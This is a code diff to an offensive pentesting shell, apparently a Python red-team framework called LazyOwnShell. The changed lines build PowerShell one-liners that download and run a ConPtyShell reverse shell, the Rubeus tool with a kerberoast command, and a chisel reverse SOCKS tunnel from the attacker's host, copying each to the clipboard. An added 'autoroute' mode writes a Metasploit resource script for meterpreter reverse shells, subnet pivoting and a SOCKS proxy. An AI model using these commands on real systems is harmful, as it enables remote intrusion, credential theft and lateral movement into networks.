@@ -1553,7 +1553,7 @@ class LazyOwnShell(Cmd):
             return
 
         os.system("cd sessions && wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 && wget https://github.com/antonioCoco/ConPtyShell/releases/download/1.5/ConPtyShell.zip")
-        cmd = f"""curl http://{lhost}/Invoke-ConPtyShell.ps1 -o Invoke-ConPtyShell.ps1 ; powershell.exe -NoProfile -ExecutionPolicy Bypass -File 'Invoke-ConPtyShell.ps1 {lhost} {lport}'"""
+        cmd = f"""iwr -uri http://{lhost}/Invoke-ConPtyShell.ps1 -OutFile Invoke-ConPtyShell.ps1 ; powershell.exe -NoProfile -ExecutionPolicy Bypass -File 'Invoke-ConPtyShell.ps1 {lhost} {lport}'"""
         os.system(f"echo '{cmd}' |  xclip -sel clip")
         print(f"    {GREEN}[+]{cmd} {YELLOW} Copied to clipboard :D {RESET}")
         return
@@ -1750,8 +1750,8 @@ class LazyOwnShell(Cmd):
             print(f"    {YELLOW}[-] lhost must be set use set lhost <ip>{RESET}")
             return
         
-        print(f"    {GREEN}[*]{YELLOW} Rubeus downloader (echo 'cmd.exe /c curl -OJ http://{lhost}/Rubeus.exe' | xclip -sel clip) copied to clipboard. {RESET}")
-        os.system(f"echo 'cmd.exe /c curl -OJ http://{lhost}/Rubeus.exe' | xclip -sel clip")
+        print(f"    {GREEN}[*]{YELLOW} Rubeus downloader (echo 'iwr -uri http://{lhost}/Rubeus.exe -OutFile Rubeus.exe' | xclip -sel clip) copied to clipboard. {RESET}")
+        os.system(f"echo 'iwr -uri http://{lhost}/Rubeus.exe -OutFile Rubeus.exe ; .\\Rubeus.exe kerberoast /creduser:domain.local\\usuario /credpassword:password' | xclip -sel clip")
         return
 
     def do_socat(self, line):
@@ -1772,20 +1772,31 @@ class LazyOwnShell(Cmd):
             print(f"    [?]{YELLOW} you must set lhost ex:{GREEN} set lhost 10.10.10.10 or payload (alias p)  {WHITE} more help: {CYAN} help set{RESET} ")
             return
         if not line:
-            print(f"    [?]{YELLOW} you must pass port by argument ex:{GREEN} chisel 3333  {WHITE} more help: {CYAN} help chisel{RESET} ")
+            print(f"    [?]{YELLOW} you must pass the ports by argument ex:{GREEN} chisel 3333 88 {WHITE} more help: {CYAN} help chisel{RESET} ")
             return
         if not os.path.exists('sessions/chisel_1.9.1_linux_amd64.gz'):
             print(f"    {YELLOW}[+] you must run download_resources before run {GREEN}chisel {YELLOW}mode server {GREEN}at port {line}{RESET}")
-  
-        print(f'    {GREEN}[*]Running {YELLOW}./sessions/chisel_1.9.1_linux_amd64 server -p {line} --reverse -v {RESET} and copied .\chisel.exe client -v {lhost}:{line} R:socks to clipboard :D')
-        command = f"curl http://{lhost}/chisel.exe -o chisel.exe ; .\\chisel.exe client -v {lhost}:{line} R:socks"
-        cmdd = f'echo "{command}" | xclip -sel clip'
-        print(f"{MAGENTA}[+] Command to copy: {GREEN}{command}{RESET}")
-        os.system(cmdd)
-        os.system(f"cd sessions && gunzip -c chisel_1.9.1_linux_amd64.gz > chisel_1.9.1_linux_amd64 && gunzip -c chisel_1.9.1_windows_amd64.gz > chisel.exe  && chmod +x * && proxychains ./chisel_1.9.1_linux_amd64 server -p {line} --reverse -v")
-        print(f"    {RED}[*] {YELLOW} Shutdown chisel tunnel at sessions in port {RED} {line} {RESET}")
+        
+        args = line.split(' ')
+            
 
+        if len(args) == 2:
+            lport = args[0]
+            rport = args[1]
+
+            print(f'    {GREEN}[*]Running {YELLOW}./sessions/chisel_1.9.1_linux_amd64 server -p {lport} --reverse -v {RESET} and copied .\chisel.exe client -v {lhost}:{rport} R:{lport} to clipboard :D')
+            command = f"iwr -uri http://{lhost}/chisel.exe -OutFile chisel.exe ; .\\chisel.exe client -v {lhost}:{rport} R:{lport}"
+            cmdd = f'echo "{command}" | xclip -sel clip'
+            print(f"{MAGENTA}[+] Command to copy: {GREEN}{command}{RESET}")
+            os.system(cmdd)
+            os.system(f"cd sessions && gunzip -c chisel_1.9.1_linux_amd64.gz > chisel_1.9.1_linux_amd64 && gunzip -c chisel_1.9.1_windows_amd64.gz > chisel.exe  && chmod +x * && ./chisel_1.9.1_linux_amd64 server --reverse -p {lport} -v")
+            print(f"    {RED}[*] {YELLOW} Shutdown chisel tunnel at sessions in port {RED} {line} {RESET}")
+
+        else:
+             print(f"    [?]{YELLOW} you must pass the ports by argument ex:{GREEN} chisel 3333 88 {WHITE} more help: {CYAN} help chisel{RESET} ")
+        
         return
+        
 
     def do_msf(self, line):
         """automate msfconsole scan or rev shell"""
@@ -1835,7 +1846,7 @@ class LazyOwnShell(Cmd):
             # Ejecutar Metasploit con el archivo de comandos
             subprocess.run(['msfconsole', '-r', rc_file_path], check=True)
 
-            if os.path(rc_file_path):
+            if os.path.exists(rc_file_path):
                 os.remove(rc_file_path)
                 # Eliminar el archivo temporal
             print(f"    {RED}[*] {YELLOW} Shutdown msfconsole scan {RED} [;,;] {RESET}")
@@ -1886,7 +1897,7 @@ class LazyOwnShell(Cmd):
             subprocess.run(['msfconsole', '-r', rc_file_path], check=True)
 
             # Eliminar el archivo temporal
-            if os.path(rc_file_path):
+            if os.path.exists(rc_file_path):
                 os.remove(rc_file_path)
             print(f"    {RED}[*] {YELLOW} Shutdown rev meterpreter sessions {RED} [;,;] {RESET}")
             return
@@ -1958,7 +1969,71 @@ class LazyOwnShell(Cmd):
                 print(f"    [+] El payload y los archivos necesarios han sido generados exitosamente. el comando {cmd} se copio en la clipboard, ejecute www para diponer los archivos mediante un servidor web")
                 os.system(cmd)
                 return
+        elif line.startswith('autoroute'):
+            # Set your parameters here
+            args = line.split(' ')
+            lhost = self.params["lhost"]
+            lport = self.params["lport"]
+            if not lhost or not lport:
+                print(f"    {YELLOW}[-] lhost or lport must be set use set lhost <ip>{RESET}")
+                return 
+            if len(args) == 1:
+                setpayload = 'windows/meterpreter/reverse_tcp'
+            elif len(args) == 2:
+                if args[1] == 'win':
+                    setpayload = 'windows/meterpreter/reverse_tcp'
+                if args[1] == 'win64':
+                    setpayload = 'windows/x64/meterpreter/reverse_tcp'
+                elif args[1] == 'lin':
+                    setpayload = 'linux/x86/meterpreter/reverse_tcp'
+                elif args[1] == 'lin64':
+                    setpayload = 'linux/x64/meterpreter/reverse_tcp'    
+                elif args[1] == 'mac':
+                    setpayload = 'osx/x86/shell_reverse_tcp'
+                elif args[1] == 'mac64':
+                    setpayload = 'osx/x64/meterpreter/reverse_tcp'
+            
+            session_id = "1"  # The session ID for the active session (adjust as necessary)
+            target_subnet = "192.168.100.0"  # The target subnet
+            netmask = "255.255.255.0"  # The netmask for the subnet
 
+            # Step 1: Create a Metasploit Resource Script
+            rc_file_path = '/tmp/autoroute.rc'
+
+            with open(rc_file_path, 'w') as file:
+                file.write(f"""
+            use exploit/multi/handler
+            set payload {setpayload}
+            set LHOST {lhost}
+            set LPORT {lport}
+            exploit -j -z
+
+            # After getting a session
+            sessions -i {session_id}
+            run post/multi/manage/autoroute RHOST={target_subnet} NETMASK={netmask}
+
+            # Exit the Metasploit console
+            exit
+            """)
+
+            # Step 2: Start Metasploit with the Resource Script
+            subprocess.run(['msfconsole', '-r', rc_file_path], check=True)
+
+            # Step 3: Set up the Metasploit SOCKS Proxy
+            subprocess.run(['msfconsole', '-q', '-x', 'use auxiliary/server/socks_proxy; set SRVHOST 127.0.0.1; set SRVPORT 1080; run -j'], check=True)
+
+            # Step 4: Configure Proxychains to Use the SOCKS Proxy
+            #proxychains_conf_path = '/etc/proxychains.conf'
+            #with open(proxychains_conf_path, 'a') as file:
+            #    file.write("\nsocks4 127.0.0.1 1080")
+
+            # Notify the user
+            print("Proxychains is configured to use the Metasploit SOCKS proxy on 127.0.0.1:1080")
+            print("You can now use proxychains with your tools, e.g., proxychains nmap -sT -Pn <target_ip>")
+
+            # Cleanup
+            if os.path.exists(rc_file_path):
+                os.remove(rc_file_path)
     def do_encrypt(self, line):
         """Encrypt a file using XOR. Usage: encrypt <file_path> <key>"""
         args = shlex.split(line)
